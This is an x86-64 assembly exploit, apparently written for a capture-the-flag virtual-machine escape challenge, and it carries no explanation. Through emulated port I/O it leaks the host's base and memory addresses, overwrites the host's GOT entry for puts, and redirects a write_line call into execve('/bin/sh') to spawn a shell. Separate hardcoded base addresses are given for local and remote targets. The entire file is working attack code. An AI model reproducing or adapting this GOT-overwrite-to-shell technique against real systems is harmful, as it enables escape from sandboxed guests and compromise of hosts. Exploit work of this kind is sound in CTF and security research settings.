BITS 64


%define marker 0x1583
%define honco 0x1508

mov eax, honco
mov edi, 0x64
out dx, al

; Gets to the base address
;REMOTE
;mov rbx, 0xfffffffffff72000
;LOCAL
mov rbx, 0xfffffffffff6a000

; Leak addess of vmem
mov rax, rbx
add rax, 0x2319
mov edi, 0x64
out dx, al

; Leak offset of execve call
lea rax, [rel execve]
mov edi, 0x62
out dx, al

; Now overwrite GOT address of puts
mov rax, rbx
add rax, 0x2130
mov rsi, 8
mov edi, 0x63
out dx, al

lea eax, [rel flag]
mov edi, 0x64
out dx, al

; DEBUG
mov edi, 0x62
out dx, al

; Now issue a write_line, which will actually call execve(/bin/sh)
mov edi, 0x64
out dx, al

; DEBUG
mov edi, 0x62
out dx, al


;loop:
;  mov rax, rbx
;  mov edi, 0x62
;  out dx, al
;
;;  mov rax, rbx
;;  mov esi, 1
;;  mov edi, 0x63
;;  out dx, al
;;
;;  mov edi, 0x62
;;  out dx, al
;
;  mov rax, rbx
;  mov edi, 0x64
;  out dx, al
;
;  sub rbx, 0x8
;  jmp loop

; Exit
mov edx, 0xc
int 0x80
hlt

; execve
execve:
  lea rdi, [rel binsh]
  push 0
  mov rsi, rsp
  mov rdx, rsp
  mov eax, 59
  syscall

flag:
  db 'flag', 0

binsh:
  db '/bin/sh', 0
